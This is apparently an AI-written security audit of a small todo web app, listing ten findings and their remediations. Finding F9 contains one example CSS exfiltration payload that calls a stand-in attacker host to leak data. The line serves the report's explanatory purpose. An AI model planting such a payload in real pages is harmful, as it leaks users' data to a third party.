# Security Review Report

**Project:** bmad-todo-app  
**Date:** 2026-04-15  
**Reviewer:** AI Security Audit (Quinn / QA Agent)  
**Scope:** Full-stack code review for XSS, injection, CSRF, misconfiguration, dependency vulnerabilities, and infrastructure security.

---

## Executive Summary

The bmad-todo-app has a **solid security baseline** for a single-user todo application. The codebase uses parameterized ORM queries (no raw SQL), React's default text escaping (no `dangerouslySetInnerHTML`), Zod validation on all API inputs, and production-appropriate security headers via Helmet and Nginx. Docker Compose uses file-based secrets for database credentials and non-root container users.

**No critical or high-severity vulnerabilities were found** in application code. The findings below are organized by severity and include specific remediations.

---

## Findings Summary

| # | Severity | Category | Finding |
|---|----------|----------|---------|
| 1 | Medium | Input Validation | No max length on `description` field |
| 2 | Medium | Auth/AuthZ | No authentication or authorization |
| 3 | Medium | DoS | No rate limiting |
| 4 | Low | Dependency | esbuild moderate vulnerability (transitive via drizzle-kit) |
| 5 | Low | Info Disclosure | OpenAPI JSON schema may be accessible even when Swagger UI is disabled |
| 6 | Low | Infrastructure | Floating Docker image tags |
| 7 | Low | Infrastructure | Dev/test profiles expose database to host network |
| 8 | Low | Config | Entrypoint DNS-based NODE_ENV downgrade |
| 9 | Info | CSP | `style-src 'unsafe-inline'` in Helmet and Nginx |
| 10 | Info | Headers | No HSTS header (expected at TLS termination layer) |

---

## Detailed Findings

### F1: No max length on `description` field [Medium]

**Location:** `packages/backend/src/validation/todo-schemas.ts:4`

```typescript
description: z.string(),
```

The Zod schema accepts any string without a max length constraint. While Fastify has a default body size limit (~1MB), a single todo description could be up to that limit, leading to:
- Database bloat (Postgres `text` column has no practical limit)
- Rendering performance issues on the frontend with extremely long strings
- Potential abuse vector in a multi-user context

**Remediation:** Add `.max(1000)` (or a reasonable limit) to the schema:

```typescript
description: z.string().max(1000),
```

---

### F2: No authentication or authorization [Medium]

**Location:** All routes in `packages/backend/src/routes/todo-routes.ts`

All API endpoints (GET, POST, PATCH, DELETE) are publicly accessible. The `user_id` column exists in the database schema but is never populated or checked. Any client that can reach the API can read, create, modify, or delete any todo.

**Current risk:** Low for a single-user local deployment. **High** if the app is ever deployed publicly or extended to multi-user.

**Remediation (when multi-user is needed):**
- Add session/JWT-based authentication middleware
- Enforce `user_id` on all queries (`WHERE user_id = ?`)
- Register a Fastify `onRequest` hook for auth verification

---

### F3: No rate limiting [Medium]

**Location:** `packages/backend/src/app.ts` (plugin registration)

No `@fastify/rate-limit` or equivalent is registered. All endpoints accept unlimited requests from any source.

**Risk:** Application-layer DoS, brute-force enumeration of todo IDs (UUIDs mitigate this), or write-spam flooding the database.

**Remediation:**

```bash
pnpm --filter backend add @fastify/rate-limit
```

Register in `app.ts` with sensible defaults:

```typescript
await app.register(import('@fastify/rate-limit'), {
  max: 100,
  timeWindow: '1 minute',
});
```

---

### F4: esbuild moderate vulnerability [Low]

**Source:** `pnpm audit`

```
Package: esbuild <=0.24.2
Path:    drizzle-kit > @esbuild-kit/esm-loader > @esbuild-kit/core-utils > esbuild
Advisory: GHSA-67mh-4wv8-2f99 (dev server request forgery)
Fix:     esbuild >=0.25.0
```

This is a **transitive dependency** of `drizzle-kit`, which is used only for database migrations. The vulnerability affects esbuild's dev server mode, which is not used in this app. Risk is minimal but the dependency chain is in production (`drizzle-kit` runs migrations in the Docker entrypoint).

**Remediation:**
- Monitor for `drizzle-kit` updates that bump the esbuild dependency
- Consider running migrations as a separate job/init-container rather than bundling `drizzle-kit` in the production image

---

### F5: OpenAPI JSON may be accessible with docs disabled [Low]

**Location:** `packages/backend/src/plugins/swagger.ts`

`@fastify/swagger` (OpenAPI JSON generation) is **always registered**. Only the UI (`@fastify/swagger-ui`) is gated behind `env.enableDocumentation`. The default Swagger plugin registers a `/documentation/json` route (or similar) that may serve the full API schema even when the UI is disabled.

**Risk:** Information disclosure of API structure, field names, and validation rules to unauthenticated users.

**Remediation:** Conditionally register both plugins:

```typescript
if (env.enableDocumentation) {
  await fastify.register(swagger, { /* ... */ });
  await fastify.register(swaggerUi, { routePrefix: '/documentation' });
}
```

Or add a route hook to block `/documentation/*` in production.

---

### F6: Floating Docker image tags [Low]

**Location:** `docker-compose.yml`

| Image | Tag | Risk |
|-------|-----|------|
| `postgres:16-alpine` | Major pinned, minor/patch floats | Low — Postgres 16.x is stable |
| `nginxinc/nginx-unprivileged:stable-alpine` | Rolling `stable` | Medium — digest changes unpredictably |
| `alpine/socat:latest` | `latest` | Dev-only, but high drift risk |

**Remediation:** Pin to specific versions or digests for production deployments:

```yaml
image: postgres:16.9-alpine
image: nginxinc/nginx-unprivileged:1.28.0-alpine
```

---

### F7: Dev/test profiles expose database to host [Low]

**Location:** `docker-compose.yml:55-75`

- `dev-db-access` publishes Postgres on **host:5432**
- `test-db` publishes on **host:5433** with hardcoded `postgres:postgres` credentials

**Risk:** Any process on the host (or LAN if Docker binds to `0.0.0.0`) can connect. The test-db uses weak credentials.

**Remediation:**
- Bind to localhost only: `"127.0.0.1:5432:5432"` and `"127.0.0.1:5433:5432"`
- Document that these profiles must never be used on shared/public servers

---

### F8: Entrypoint DNS-based NODE_ENV downgrade [Low]

**Location:** `packages/backend/docker-entrypoint.sh:27-37`

If `NODE_ENV=production` and DNS lookup of `dev-db-access` succeeds, the entrypoint **silently downgrades** `NODE_ENV` to `development`. This relaxes CORS (allows all origins), disables CSP, and enables verbose error messages.

**Risk:** If any container or DNS alias named `dev-db-access` exists on the production network, security controls degrade silently.

**Remediation:** Remove the auto-detection or make it opt-in via an explicit env var like `AUTO_DETECT_DEV=true`.

---

### F9: `style-src 'unsafe-inline'` [Info]

**Location:** `packages/frontend/nginx.conf:17` and `packages/backend/src/plugins/helmet.ts:18`

Both the Nginx CSP and Helmet CSP allow `'unsafe-inline'` for styles. This is required by the filter-tabs component (inline `style` attribute for the animated indicator) and is a common tradeoff for SPAs.

**Risk:** If an HTML injection vector existed, inline style injection could be used for data exfiltration via CSS (e.g., `background: url(attacker.com?data=...)`). No such injection vector exists in this codebase.

**Remediation (future hardening):** Replace inline styles with CSS classes/variables to enable `style-src 'self'` without `'unsafe-inline'`. Low priority given no injection sinks.

---

### F10: No HSTS header [Info]

**Location:** `packages/frontend/nginx.conf`

No `Strict-Transport-Security` header is set. This is appropriate if TLS terminates at an upstream proxy (load balancer, CDN) which should set HSTS.

**Remediation:** If this nginx instance terminates TLS directly, add:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

---

## What's Working Well (Positive Findings)

### Injection Prevention
- **SQL injection: Not vulnerable.** All database queries use Drizzle ORM's parameterized query builder. No raw SQL with string interpolation exists in application code.
- **NoSQL injection: N/A.** PostgreSQL only.

### XSS Prevention
- **Stored XSS: Not vulnerable.** React renders `todo.description` as text children (`{todo.description}` inside `<p>`), which auto-escapes HTML entities. No `dangerouslySetInnerHTML` exists in the codebase.
- **Reflected XSS: Not vulnerable.** No URL parameters, query strings, or hash fragments are rendered in the UI. No client-side router exists.
- **DOM XSS: Not vulnerable.** No `eval()`, `new Function()`, `document.write()`, or `innerHTML` with user data. The one `document.querySelector` call uses `CSS.escape()` to prevent selector injection.
- **Error messages:** Server error details are masked in production (5xx returns generic "Internal Server Error"; validation errors return generic "Request validation failed"). Error banner in the frontend uses hardcoded strings, not API error text.

### CSRF Protection
- API uses JSON content type (not form-encoded), which prevents simple CSRF from HTML forms.
- CORS in production restricts origins to an explicit allowlist.
- `credentials: true` is set but no cookies/sessions exist yet, so CSRF is not currently exploitable.

### Input Validation
- All route parameters validated via Zod (`z.uuid()` for IDs, typed schemas for bodies).
- `description` is trimmed and checked for empty after trim.
- `dueDate` validated as ISO date format or null.
- `isCompleted` validated as boolean.

### Data Exposure
- `toTodoDto()` strips `userId` from database rows before API response.
- Response schemas enforce output shape via Zod serialization.

### Infrastructure
- Docker Compose uses file-based secrets (not inline passwords).
- Production database has no published ports.
- Backend runs as non-root user in Docker.
- Frontend uses `nginxinc/nginx-unprivileged` image.
- Security headers (X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, CSP) are set in Nginx.
- Helmet provides equivalent headers on the backend API.

### Dependency Management
- `pnpm` with integrity-hashed `packageManager` field.
- Frozen lockfile in Docker builds.
- Only 1 moderate advisory (transitive, dev-server-only vulnerability in esbuild).

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| **P1** | F1: Add `description` max length | 5 min | Prevents abuse, improves data quality |
| **P1** | F7: Bind dev/test DB to localhost | 5 min | Reduces accidental exposure |
| **P2** | F3: Add rate limiting | 30 min | Prevents DoS on public deployments |
| **P2** | F5: Gate OpenAPI JSON behind docs flag | 10 min | Reduces information disclosure |
| **P2** | F8: Remove auto NODE_ENV downgrade | 15 min | Prevents silent security degradation |
| **P3** | F6: Pin Docker image tags | 10 min | Improves supply-chain reproducibility |
| **P3** | F2: Add authentication | Days | Required before multi-user/public deployment |
| **Defer** | F4: esbuild transitive vuln | Upstream | Monitor for drizzle-kit update |
| **Defer** | F9: Eliminate unsafe-inline styles | Hours | Low priority, no injection vectors |
| **Defer** | F10: HSTS | 5 min | Only if TLS terminates at this nginx |

---

## Conclusion

The application demonstrates **security-conscious development practices**: parameterized queries, strict input validation, production error masking, CSP headers, CORS allowlisting, non-root containers, and secret file management. The primary gaps (no auth, no rate limiting, unbounded description) are expected for a single-user development-stage application and are well-understood tradeoffs. The P1 items (max length + localhost binding) are quick wins that should be applied immediately.
